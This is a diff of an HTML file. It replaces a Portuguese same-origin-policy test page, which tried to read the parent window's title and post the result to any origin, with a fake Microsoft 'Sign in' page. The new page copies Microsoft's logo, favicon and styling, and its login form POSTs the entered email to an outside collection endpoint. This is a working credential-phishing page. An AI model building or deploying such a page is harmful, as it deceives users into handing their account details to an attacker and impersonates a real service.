@@ -1,50 +1,92 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Teste de SOP - iframe</title>
+  <meta charset="UTF-8" />
+  <title>Sign in to your account</title>
+  <link rel="icon" href="https://login.live.com/favicon.ico">
   <style>
     body {
-      background: #111;
-      color: #0f0;
-      font-family: monospace;
+      font-family: "Segoe UI", sans-serif;
+      background: linear-gradient(to bottom right, #f3f3f3, #dbe5f1);
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      flex-direction: column;
+      margin: 0;
+    }
+    .box {
+      background: white;
+      width: 400px;
+      padding: 40px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      border-radius: 6px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 14px;
+      margin-top: 10px;
+      box-sizing: border-box;
+    }
+    .links {
+      font-size: 12px;
+      margin-top: 10px;
+    }
+    .links a {
+      color: #0067b8;
+      text-decoration: none;
+      margin-right: 10px;
+    }
+    .buttons {
+      margin-top: 20px;
+      display: flex;
+      justify-content: space-between;
+    }
+    .buttons button {
+      padding: 10px 20px;
+      font-size: 14px;
+      border: none;
+      border-radius: 2px;
+    }
+    .back {
+      background: #f3f3f3;
+      color: black;
+    }
+    .next {
+      background: #0067b8;
+      color: white;
+    }
+    .options {
+      margin-top: 20px;
+      text-align: center;
+      background: white;
+      padding: 10px;
+      border-top: 1px solid #ccc;
+      font-size: 13px;
     }
   </style>
 </head>
 <body>
-  <h2>🧪 Testando acesso ao DOM da janela pai...</h2>
-  <pre id="resultado">Aguardando resposta...</pre>
-
-  <script>
-    const resultado = document.getElementById("resultado");
-
-    try {
-      // Tenta ler o título da página pai
-      const tituloPai = window.parent.document.title;
-      
-      resultado.innerText = `✅ Sucesso! Título da página pai: "${tituloPai}"`;
-      
-      // Também envia via postMessage para a aba do Microsoft Lists
-      parent.postMessage({
-        tipo: "sop-test",
-        sucesso: true,
-        titulo: tituloPai
-      }, "*");
-
-    } catch (e) {
-      resultado.innerText = `❌ Acesso bloqueado ao DOM da página pai. SOP está protegendo corretamente.`;
-      
-      // Envia mensagem de erro para log externo
-      parent.postMessage({
-        tipo: "sop-test",
-        sucesso: false,
-        erro: e.toString()
-      }, "*");
-    }
-  </script>
+  <div class="box">
+    <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft" width="110">
+    <h2 style="margin:0 0 10px 0;">Sign in</h2>
+    <form action="https://aaaaa/collect" method="POST">
+      <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+      <div class="links">
+        <a href="#">No account? Create one!</a><br>
+        <a href="#">Can't access your account?</a>
+      </div>
+      <div class="buttons">
+        <button type="button" class="back">Back</button>
+        <button type="submit" class="next">Next</button>
+      </div>
+    </form>
+  </div>
+  <div class="options">
+    🔐 Sign-in options
+  </div>
 </body>
 </html>
